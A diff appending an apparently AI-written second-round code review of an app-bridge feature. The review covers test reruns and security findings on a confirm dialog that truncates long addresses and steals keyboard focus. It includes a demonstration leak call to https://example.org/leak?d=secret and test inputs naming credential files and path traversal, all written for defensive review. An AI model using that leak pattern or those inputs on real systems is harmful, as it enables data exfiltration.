@@ -655,3 +655,304 @@ None. I grepped the tracked diff and every untracked file (`xargs -0 grep`) for 
 ## Usage
 
 claude-opus-5-5, about 475,000 tokens.
+
+# Repair round 2, refuted
+
+Five findings need a fix before E4 lands. Two of them are security holes in the new `open({ url })`:
+- **The whole address is not shown.** The Confirm does not show a long address whole.
+- **The Confirm takes the keyboard.** It focuses its own Confirm button, so the reader's next Enter, typed into the app, opens the address.
+
+The other three:
+- **Item 2 (Z593), the dark themes.** It was built as briefed, but native controls inside an app frame still stay light in a dark theme. An app that sets no colour scheme of its own now gets an opaque white background. In the light themes an app follows the operating system's dark mode, not the oculus theme.
+- **Item 3 (Z594), frame focus.** A press in a frame activates its pane only when the focus comes from the page. A press from one frame into another frame changes nothing.
+- **Item 7 (Z600), the dropped rows.** The 52 rows were dropped as round 2's item 7 says, and every row I sampled duplicates an outcome another row still gives. But plan.md's text of Z600 also says the brief's case list is the least a table holds. About 15 cases that E4.md lists no longer have a row. That conflict is the orchestrator's to rule on.
+
+Every verify command is green. I changed nothing in the worktree, the ledger or config. My scratch oculus on port 8799 is stopped (`lsof -nP -iTCP:8799 -sTCP:LISTEN` printed nothing), and no headless Chrome of mine is left running.
+
+## 1. Verify lines (rerun from the worktree's `tools/oculus`)
+
+`bash ~/.claude-work/skills/land/templates/checks.sh .../orchestrator-state.md` exited 0. Output of the second run, which I captured with its exit code:
+```
+$ npm run test:quick
+test:quick: 144 changed file(s), from git since HEAD
+test:quick: 91 test file(s), 10 essential
+ok      prettier (0.5 s): All matched files use Prettier code style!
+ok      ASCII gate (0.5 s)
+ok      svelte-kit sync (1.6 s)
+ok      eslint (1.6 s)
+ok      svelte-check (6.2 s): 1791243278470 COMPLETED 380 FILES 0 ERRORS 0 WARNINGS 0 FILES_WITH_PROBLEMS
+ok      vitest (16.2 s): Duration  13.38s (transform 12.72s, setup 0ms, import 26.52s, tests 24.99s, environment 130ms)
+test:quick: 16.9 s (limit 45.0 s); every command passed
+test:quick: not covered: tests outside the selection, tests/checks, slow tests,
+            build, lint of unchanged files; npm run test:landing runs them
+checks: 1 commands passed
+```
+The first run, under load, printed `test:quick: 54.2 s (limit 45.0 s); every command passed` and `test:quick: over the time limit`, then `checks: 1 commands passed`.
+
+`npm run test:checks` exited 0: `Test Files  15 passed | 1 skipped (16)`, `Tests  226 passed | 3 skipped (229)`.
+
+## 2. The report's evidence, rerun
+
+- **The nine Z600 files** (`npx vitest run` with the JSON reporter): 242 tests passed out of 242, as the report says.
+  - Tests per file: manifest 55, app-files 23, app-open 30, app-gate 17, methods 42, approve 10, app-store 7, file.test.ts 5, settings.test.ts 53.
+  - Rows per table: `appsSettings` 13, the file route's apps table 4, the G1 approve table 1.
+  - Against the round-1 reviewer's counts, the drops match the report's 12, 6, 3, 9, 9, 6 (and 5 added), 1, 4 and 2.
+- **P1, the M4 net logs.** `python3 $S/cdp/netpre.py` gives:
+  - on `net-m4r1-frame.json` and `net-m4r2-frame.json`: `127.0.0.1:9444: preconnects 1, URL_REQUESTs 0, request headers sent 0`;
+  - on the two control logs: `preconnects 2, URL_REQUESTs 2, request headers sent 2`. So the counter does see a request when one is sent.
+- **Z593 run.** `$S/runs/c101z.out` holds two more columns than the report quotes, `sameDocument` and `appSeesDark`. `appSeesDark` is `true` on every line, in the light themes too. See Proof P1.
+- **Z599 and Z594 runs.** I reran both behaviours on my own scratch oculus (port 8799, own engine, home and state under my scratchpad `rv2/`, headless Chrome on a scratch profile over a pipe). The results are under Behaviour.
+
+## 3. Verdicts, round 2 items
+
+1. **Z599, `open({ url })`: built, two security findings.** The code holds what the item asks:
+   - `methods.ts:121-132`: an `http:` or `https:` address of at most 2048 characters with no user name or password; anything else rejects `closed`.
+   - `methods.ts:301-312`: the call counts toward the open limit first (`opens.take()` at `:277`), then the Confirm, then `declined` on a no.
+   - `apps.svelte.ts:313`: `window.open(address, '_blank', 'noopener,noreferrer')`.
+   - `oculus.js:74-95, :132-137`: the link listener.
+   - The Confirm words are in `apps.yml:67`; DESIGN.md :327, :337 and :339 and HELP.md:209 are updated.
+   - The five rows are in the methods table.
+   - Behaviour B1 and B2 below are the defects.
+2. **Z593: built as briefed, behaviour not reached.** Thirteen dark classes carry `color-scheme: dark` (`themes.css:14 ... :740`). The four light ones carry none. See Behaviour B3.
+3. **Z594: partial.** `Workbench.svelte:302` and `workbench-keys.svelte.ts:439-448` work from the page into a frame. They do not work from one frame into another. See Behaviour B4.
+4. **S1: holds.** The second effect is at `+page.svelte:83-92`. One small point is under Behaviour B5.
+5. **S2: holds.**
+   - `FrameLayer.svelte:172` is the sandbox line, and `Workbench.svelte:299-304` is the `<svelte:window>`.
+   - The new DESIGN.md:278 anchor `+page.svelte:84-92` starts inside the comment. See Spec S3.
+6. **Z601: holds.** `app-store.test.ts:32` has the new title. E4.md:247 still carries the old one; see Spec S2.
+7. **Z600: holds as round 2's item 7 words it; it conflicts with plan.md's Z600 text.** See section 6.2 and Spec S1.
+8. **P1 (M4): holds.** The report states the net-log result and it was not rerun, as the item says. My recount matches.
+
+## 4. Verdicts, E4.md items 1 to 15 (the whole diff)
+
+- **1, the manifest and where an app lives: holds.** The table is green. Some case inputs from E4.md are no longer rows (Spec S1).
+- **2, the watcher: holds.** Round 2 did not change it.
+- **3, the first frame: holds.**
+- **4, an app added, changed or removed: holds**, for the look.
+- **5, serving: holds.**
+- **6, the frame: holds**, with Z593's effects (B3). DESIGN.md:306 says "The frame element paints nothing", which is now false in a dark theme for an app that sets no colour scheme.
+- **7, the bridge: holds.**
+- **8, what an app keeps: holds.**
+- **9, writes: holds.** B2's keyboard hole applies to the write Confirm too.
+- **10, `open`: holds for the view, project and file targets; `{ url }` is partial** (B1, B2).
+- **11, approval: holds.**
+- **12, reading an app's files: holds.**
+- **13, words and settings: holds.**
+- **14, the measurements: holds** (P1 recount).
+- **15, the look:** the orchestrator's, at landing. Section 6.3 lists what it must cover.
+
+**Cases:**
+- **Met by the green tables:** the G49, G50, G8, G9, G13 and G31 cases.
+- **Partial under plan.md's Z600 text** (a listed input with no row): C4, C7, C11, C12, C20 (the space key's id in the manifest table and its header in the gate table), C31, C32, C35, C48, C53, C63, C65, C71 and C73.
+- **Partial, from my runs:** C61 (B2) and C101 (B3).
+- **C38 and C64:** met in the round-1 reviewer's live runs; round 2 did not touch that code.
+- **C85:** open until A3 lands.
+
+## 5. Z599 security, answered point by point
+
+My run is `node rv2/url.mjs`, which calls `window.run.open` from inside the app and reads the Confirm.
+
+| Address | Confirm `detail` | Outcome |
+|---|---|---|
+| 210 characters, no spaces | the whole text | `scrollWidth` 1080, `clientWidth` 480: runs past the box and off a 1400 px viewport (`rv2/url210.png`) |
+| 1520 characters | the whole text | `scrollWidth` 9306, `clientWidth` 480 |
+| `https://user:pw@...`, `https://:p@...` | no dialog | `closed` |
+| `javascript:alert(1)`, `data:text/html,hi` | no dialog | `closed` |
+| over 2048 characters | no dialog | `closed` |
+| Cyrillic host `https://<Cyrillic e, U+0435>xample.org/` | `https://xn--xample-2of.org/` | punycode shown |
+| `https://ex%61mple.org/` | `https://example.org/` | decoded host shown |
+| a right-to-left override in the path | `https://example.org/%E2%80%AEgnp.exe` | percent-encoded |
+| `http://localhost:8799/api/file/hub/README.md` | that address | asks |
+
+- The page shows `parsed.href` and opens that same string, so what is shown is what is opened.
+- `noopener` and `noreferrer` are set (`apps.svelte.ts:313`).
+- The rate limit counts every `{ url }` call, including refused and declined ones, since `opens.take()` runs before the shape is judged.
+
+**The bridge's link rule.**
+- `ownAddress()` cuts the address after `/apps/<name>/<key>/`, or `/apps/@<root>/<name>/<key>/` for a root app. The URL parser folds `..` and `%2e%2e` segments, so a climb out of the app's folder becomes an outside address.
+- A link to another oculus path is outside and goes through the Confirm. Opened by `window.open` from the page, such a tab is same-origin, so the request guard admits it.
+- I read every GET route under `src/routes/api`. Each is a read; the two OAuth callbacks are already unguarded and are protected by their minted `state`.
+- What such a tab shows reaches only the reader, never the app, because the tab has no opener.
+- So the rule is sound once B1 and B2 are fixed.
+- Gaps that end in `apps.load_failed`, as the brief allows:
+  - SVG `xlink:href` links and `<area>` links;
+  - a press before the handshake resolves;
+  - a link whose click the app stops with `stopPropagation`.
+
+## 6. Particular checks
+
+### 6.1 Closures
+
+- No check was removed in place of a fix, apart from the Z600 drops, which a ruling ordered.
+- One fix reaches past its finding: `themes.css:1-8`'s head comment was reworded ("token values unchanged"). The wording is accurate, so this is not a defect.
+- The two `.scratch` files that show modified in the worktree (`briefs/E4.md`, `spec.md`) are the orchestrator's no-breakage edits. They must stay out of the landing commit.
+
+### 6.2 Z600: one sampled row per file
+
+For each file, the dropped row and the row that still gives the same outcome by the same decision:
+- **manifest:** `-x`, `@x`. The kept `Notes`, `a/b` and 41-character rows hit the same regex, `^[a-z][a-z0-9-]{0,39}$`.
+- **app-files:** a link inside the folder. The kept "another path of no record" row gives the same 404; links are left out of the recorded list at scan time, and manifest row `:416` still covers that.
+- **approve:** the G1 wrong token. The kept no-token row goes through the same `tokenedBody` comparison.
+- **app-open:** `.ssh/id_ed25519`. The kept `.env` row hits the same dot-led segment clause. The parameter given twice is the same `once()` expression as absent (`routes.ts:134-137`, `all.length === 1`).
+- **app-gate:** a kind header naming another open kind. The kept "body of another kind" row hits the same `named !== kind` clause (`app-gate.ts:120`).
+- **methods:** `document`. It takes the same `unlisted` branch as the kept `terminal` row.
+- **file.test.ts:** an app's script. It is in an apps folder, so `text/plain`, like the kept page row.
+- **settings:** `closed_paths` not a list. Same `!Array.isArray` clause as the missing key (`settings.ts:362`).
+- **app-store:** `view` given twice. The same `once()` as no view.
+
+Every sample holds.
+
+### 6.3 What Z593's look must check
+
+Dark theme on TEST, then a light theme. Each line names the place to look:
+- **Scrollbars:**
+  - everywhere none is styled (only `Tabs`, `GlyphList`, `SuggestInput`, `HueSelect` and `RailList` style theirs): the Files tree, the editor, Markdown, Findings, History, Settings;
+  - the terminal's scrollbar;
+  - the scratch app frame's scrollbars.
+- **Native controls:**
+  - `ui/forms/Checkbox.svelte:53`;
+  - `ui/forms/DateInput.svelte:31`, with its date picker opened;
+  - `ui/forms/choice/Select.svelte:37`, with its dropdown opened;
+  - `ui/forms/TextArea.svelte:79`;
+  - the option box of `ui/controls/Confirm.svelte:58`;
+  - the Calendar view (`Calendar.svelte:313` uses `color-scheme: inherit`).
+- **Text inputs:** autofill backgrounds, caret and selection colours, and default focus rings.
+- **The Document view** on a manual with no background or scheme of its own. By the same browser rule as B3 it should now draw on an opaque white backdrop in a dark theme; I inferred this and did not run it.
+- **The File view's PDF frame.**
+- **An app frame:** one with no `color-scheme` (opaque white in a dark theme, B3) and one that declares `light dark`.
+- **The light themes on a Mac set to dark mode:** an app or manual that declares `light dark` renders dark (B3).
+
+### 6.4 Tests and `guarded.md`
+
+All added tables sit under the titles E4.md names. `guarded.md` does not yet name them by file and title: G49 (:36) and G50 (:100) point at E4.md, and G1 :9, G8 :42, G9 :45 and G31 :70 name none of E4's tests. This is landing work (Spec S2).
+
+### 6.5 Breakage code
+
+None.
+- `grep -i -E "mutat|revert|inject|sabotag|stryker|\bfault\b|breakage|deliberately broken"` over every added line of the tracked diff and every untracked file printed nothing (9139 lines).
+- Over the builder's scratch scripts, the one hit is a `MutationObserver` in `debug-open2.mjs`, which only counts removed frames.
+
+## 7. Findings
+
+### Spec
+
+- **S1. Z600's text against round 2's item 7.**
+  - plan.md:1332 says a table keeps every row with a different outcome, "the brief's case list being the least it holds".
+  - Round 2's item 7 kept only the dropping half, and the builder followed the round brief.
+  - These listed inputs no longer have a row (`grep` over the six files prints nothing for each):
+    - C65: `.ssh/id_ed25519`, `.oculus/approvals.json`, `a/.git/config`, `/etc/hosts`;
+    - C71: the binary file and the `.docx`;
+    - C4: `-x`, `@x`;
+    - C7: `.a/index.html`, `a//b.html`;
+    - C12: `https://h.org/p`, `?q=1`, `ftp://h.org`;
+    - C11: `rail`, `session`;
+    - C20: the space key's id (manifest) and header (gate);
+    - C31: another app's key;
+    - C32: `%2e%2e`;
+    - C35: POST and a foreign Host for the shared files;
+    - C53 and C73: a parameter given twice;
+    - C63: `document`, `file`, `source`, `project`;
+    - C48: `Date`.
+  - **Failure scenario:** a later change that, say, decodes the path before the segment rule has no row on the inputs E4.md chose to guard G49 with.
+  - **Options:**
+    - (a) Restore those inputs, as rows or as extra inputs in the rows that kept their sibling. About 25 inputs across manifest, app-files, app-open, app-gate, methods and app-store. Test-only, a medium landing fix.
+    - (b) Accept the drops and record that E4.md's case list was narrowed. This is the lazy option.
+  - **Recommendation:** (a), since plan.md's text of the ruling says so.
+- **S2. Test titles for `guarded.md` at landing.** E4.md:247 still names the app-store title with "405". The landing writes G49's Test line (:36) with each file and title of section 6.4, G50's (:100) with store-cache, and these:
+  - G1 :9: `approve.test.ts` 'refuses a request without the write token';
+  - G8 :42: `tests/server/edit/app-store.test.ts` 'writes the store of an app as the app-store kind';
+  - G9 :45:
+    - `changes.test.ts` 'keeps the values of a record outside its line and deletes them when the record leaves the window';
+    - `undo.test.ts` 'puts an app store back to the value before, and refuses it once the store has moved or the kept values are gone';
+  - G31 :70: `approvals.test.ts` 'reads a file that is not JSON as no approved app and refuses an app approval or revoke over it'.
+
+  Small: ledger text only.
+- **S3. Sentences the code does not hold.**
+  - DESIGN.md:327 says the Confirm "shows the whole address on its own line", and HELP.md:209 says "oculus shows ... the whole address". Both are false until B1 is fixed.
+  - DESIGN.md:306, "The frame element paints nothing", is false in a dark theme for an app with no colour scheme (B3).
+  - DESIGN.md:278 cites `+page.svelte:84-92`; the effect with its comment is :83-92.
+  - The comment at `+page.svelte:83-85`, "a seed older than the rows already held is ignored", is half true (B5).
+  - Small landing fixes, after B1, B3 and B5.
+
+### Proof
+
+- **P1. The Z593 run quote drops two columns** that `$S/runs/c101z.out` holds, `sameDocument` and `appSeesDark`. `appSeesDark` is `true` in "light" and "vscode-light-modern", which contradicts the report's reading that "a light theme [gives] normal for both" settles C101.
+  - **Failure scenario:** the orchestrator accepts C101 from an edited quote that hides the defect.
+  - Small: correct the report's quote when booking.
+- **P2. The Z599 run read the Confirm's `detail` from the DOM**, its `textContent`, not from what the reader can see. That is how "the whole address on its own line" passed while a 210-character address runs off the screen (B1).
+- **P3. The Z594 run covers only a press from the page into a frame.** Its row is reported DONE although a press from one frame into another fails (B4).
+
+### Standards
+
+- Nothing beyond Spec S2 and the two orchestrator files of section 6.1.
+- My grep of round 2's added comments and test titles for the history words of `agents/spec.md:36` found only time-order "before".
+
+### Behaviour
+
+- **B1. The Confirm cuts off a long address.**
+  - **Where:** `ui/controls/Confirm.svelte:97-102`. `.detail` has `white-space: pre-line` and no wrap rule; `.box` is `max-width: 30rem`.
+  - **Run:** a 210-character address measures `scrollWidth` 1080 against `clientWidth` 480 and runs off the right edge of a 1400 px window (`rv2/url210.png`).
+  - **Failure scenario:** an app builds `https://site/?q=<what it read>`. The reader sees the start of the address, confirms, and the data leaves in the part they never saw. This defeats Z599's stated guarantee.
+  - **Fix:** `overflow-wrap: anywhere;` in `.detail`, one line. It also helps every other Confirm with a long detail. Small, landing fix.
+- **B2. The Confirm takes the keyboard from the reader.**
+  - **Where:** `ui/controls/Confirm.svelte:50`, `onopen={() => yes?.focus()}`.
+  - **Run** (`node rv2/kj.mjs`): the reader types "ab" in the app's field; the app calls `open({ url: 'https://example.org/leak?d=secret' })`. The page's focus moves to `BUTTON "Confirm" in dialog: true`; the next Enter resolves the call and opens `https://example.org/leak?d=secret`.
+  - **Failure scenario:** an app watches its own key presses and asks just before the reader presses Enter. The same applies to the write Confirms (`delete-entry` and the others).
+  - **Fix options:**
+    - (a) An app's question focuses Cancel. That is a `focus` prop on `Confirm.svelte`, passed through `views/shared/writes/AskConfirm.svelte:29-36` and `ask.ts`, set in `AppFrame.svelte:157-166`. About 10 lines.
+    - (b) The Confirm button ignores presses for a moment after the dialog opens.
+    - Leaving it is the lazy option.
+  - **Recommendation:** (a). It changes which control holds the keyboard, which is a user-visible shape, so it is an automode decision. Small to medium at landing.
+- **B3. Z593 does not reach the app's controls, and light themes follow the operating system.**
+  - **Run** (`node rv2/cs.mjs` and `cs2.mjs`, a scratch app with a checkbox, a select and a text field):
+    - **dark theme:** the frame's scheme is `dark`, the app's root scheme is `normal`, `appSeesDark` is true, and the app is drawn on an opaque white backdrop with light controls (`rv2/cs-dark.png`). The light theme leaves the backdrop transparent (`cs-light.png`).
+    - **light theme:** the frame's scheme is `normal` and `appSeesDark` is `true`. With the frame set to `light`, `appSeesDark` is `false`, so Chrome hands the frame element's scheme to the app's `prefers-color-scheme`.
+    - **an app that sets `light dark` in a dark theme:** dark controls and white text.
+  - **Failure scenarios:**
+    - In every dark theme an app with no scheme of its own shows a white slab with light controls, so the defect Z593 names stays.
+    - On a Mac in dark mode, an app or manual that follows `prefers-color-scheme` draws dark inside a light oculus theme.
+  - **Fix:**
+    - `color-scheme: light` on the base `body` rule at `themes/tokens.css:218`. This goes against round 2's item 2 ("the light ones get none"), so it needs a ruling.
+    - `oculus.js` `paint()` (:56-62) sets `root.style.colorScheme = 'light dark'`, so an app follows the frame unless it sets its own scheme. Visible to app authors, so it needs a ruling.
+    - DESIGN.md:306 says both.
+  - Small at landing, two lines and a sentence, once ruled.
+- **B4. A press in one frame after another does not move the active pane.**
+  - **Where:** `workbench-keys.svelte.ts:439-448` hears only the window's `blur`, which does not fire when the focus moves from one frame to another.
+  - **Run** (`node rv2/ff.mjs`, two app frames in two panes): a press in Probe zed activates its pane. A following press in Probe scheme moves `document.activeElement` to that iframe, but the active pane stays Probe zed.
+  - **Failure scenario:** an app beside a manual or another app. The reader works in the second frame while the pane chords act on the first.
+  - **Fix:** in `FrameLayer.svelte`'s animation-frame loop (:64-99), compare `document.activeElement` with the last one seen and raise the same `focusin` on the new frame's slot. About 8 lines. Small, landing fix.
+- **B5. The second effect can register rows older than the ones held.**
+  - **Where:** `+page.svelte:86-92`. When `seedApps` drops a seed older than the held rows (`entities.svelte.ts:40`), the effect still calls `registerApps(client.registry, rows)` with the load's rows. The registry then shows them until the next `apps` push.
+  - **Failure scenario:** the window between a load and a newer push. It is narrow and the next push repairs it.
+  - **Fix:** call `registerApps(client.registry, appRows())` after the seed. One line, small.
+
+## 8. Declined to judge
+
+- **The Document view and PDF frames in a dark theme.** I inferred them from the app-frame run and did not run them; they are for the look.
+- **A frame in a floating window.**
+- **Axel's server and TEST.** I did not touch them.
+- **M1 to M3 reruns.** I read the builder's outputs and recounted only M4.
+- **The curl-dependent cases.** The task forbids curl; where a table holds one, the table covers it.
+- **The look of every theme.**
+- **`npm run diagrams`.** It writes files; the tree checks passed.
+- **Round 2's delta alone.** No snapshot of round 1 exists, so I judged round 2's files against the base.
+
+## 9. Usage
+
+claude-opus-5-5. My token count is not visible to me: about 330,000, not verified.
+
+## Closed
+
+Every finding of the run over round 2, the last round, is fixed at E4's landing on main, since each is small and inside the brief; none goes to the builder.
+
+- S1: the 14 cases' inputs restored to their tables (Z602).
+- S2: `guarded.md` names E4's tests by file and title for G1, G8, G9, G31, G49 and G50; E4.md:247's title follows Z601.
+- S3: DESIGN.md:278, :306 and :327, HELP.md:209 and the comment at `+page.svelte:83-85` made true after B1, B3 and B5.
+- P1: the booking quotes `c101z.out` whole, `appSeesDark` included; C101 is judged on the run after B3's fix.
+- P2: the run after B1's fix measures the Confirm's detail as drawn (`scrollWidth` against `clientWidth`).
+- P3: the run after B4's fix covers a press from one frame into another.
+- B1: `overflow-wrap: anywhere` on the Confirm's detail.
+- B2: an app's Confirm opens with the keyboard on Cancel (Z603).
+- B3: `color-scheme: light` on the base body and `light dark` on an app's root from `oculus.js` (Z604).
+- B4: `FrameLayer.svelte`'s frame loop raises `focusin` on the slot of a frame that newly holds the focus.
+- B5: the second effect registers `appRows()` after the seed.
